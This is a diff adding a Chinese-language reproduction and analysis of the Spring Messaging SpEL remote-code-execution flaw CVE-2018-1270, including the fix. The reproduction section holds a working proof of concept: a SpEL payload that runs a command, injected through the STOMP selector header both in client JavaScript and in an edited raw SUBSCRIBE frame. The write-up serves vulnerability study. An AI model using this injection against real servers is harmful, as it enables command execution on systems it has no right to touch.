@@ -389,8 +389,6 @@ String pathSource = Arrays.stream(path.split("/"))//
         .collect(Collectors.joining("."));
 ```
 
-
-
 ## CVE-2018-1270
 
 **Spring Messaging 远程命令执行漏洞（CVE-2018-1270）**
@@ -399,8 +397,77 @@ String pathSource = Arrays.stream(path.split("/"))//
 >
 >在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用`StandardEvaluationContext`解析，造成命令执行漏洞。
 
+### 影响版本
 
+- Spring Framework 5.0 to 5.0.4
+- Spring Framework 4.3 to 4.3.14
+- Older unsupported versions are also affected
 
-## CVE-2018-1273
+### 漏洞复现
+
+下载官方教程：`git clone https://github.com/spring-guides/gs-messaging-stomp-websocket`，之后切换到漏洞版本的分支：`cd  gs-messaging-stomp-websocket`，`git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3` 
+
+打开app.js文件，修改`connect()`函数：
+
+```js
+function connect() {
+    var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('open -a Calculator')"};
+    var socket = new SockJS('/gs-guide-websocket');
+    stompClient = Stomp.over(socket);
+    stompClient.connect({}, function (frame) {
+        setConnected(true);
+        console.log('Connected: ' + frame);
+        stompClient.subscribe('/topic/greetings', function (greeting) {
+            showGreeting(JSON.parse(greeting.body).content);
+        },header);
+    });
+}
+```
+
+![image-20220317103753934](../../assets/images/image-20220317103753934.png)
+
+之后重新点击Connect，再随意send一段内容：
+
+![image-20220317103951109](../../assets/images/image-20220317103951109.png)
+
+因为连接是基于**stomp**协议，我们还可以在协议层直接修改：
+
+正常**connect**，**burpsuite** 所抓取的内容：
+
+`["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\n\n\u0000"]`
+
+修改为：`["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('open -a Calculator')\n\n\u0000"]`，增加了一个selector。
+
+之后随意发送一段内容，弹出计算器。
+
+### 漏洞分析
+
+从第二种复现方法中，我们可以看出来，漏洞的source点在于client端发送的`SUBSCRIBE`命令中，根据[官方文档](https://stomp.github.io/stomp-specification-1.0.html#frame-SUBSCRIBE)的描述，我们终点放在这一段：
+
+![image-20220317110243574](../../assets/images/image-20220317110243574.png)
+
+当发送`SUBSCRIBE`命令时，Stomp支持*selector* header，该选择器充当基于内容路由的筛选器。
+
+定位到`org.springframework.messaging.simp.broker.DefaultSubscriptionRegistry.addSubscriptionInternal()`：
+
+点击 connect后，js发送建立订阅的stomp请求，代码从这获取了header，并创建了expression，注册到了`subscriptionRegistry`中。
+
+![image-20220317113542176](../../assets/images/image-20220317113542176.png)
+
+但是rce的触发点不是在connect中，而是send。
+
+当我们点击send后，会调用`org.springframework.messaging.simp.broker.SimpleBrokerMessageHandler.sendMessageToSubscribers()`
+
+![image-20220317120352515](../../assets/images/image-20220317120352515.png)
+
+逐步跟进到`filterSubscriptions()`
+
+![image-20220317120843527](../../assets/images/image-20220317120843527.png)
+
+先通过两个for循环，拿到了我们之前在`subscriptionRegistry`中注册的sub，然后获取了sub中的expression，通过`expression.getValue`触发SpEL RCE漏洞。
+
+### 漏洞修复
+
+用`SimpleEvaluationContext`来替代了`StandardEvaluationContext`，也就是采用了SpEL表达式注入漏洞的通用防御方法。
 
 ## CVE-2022-22947
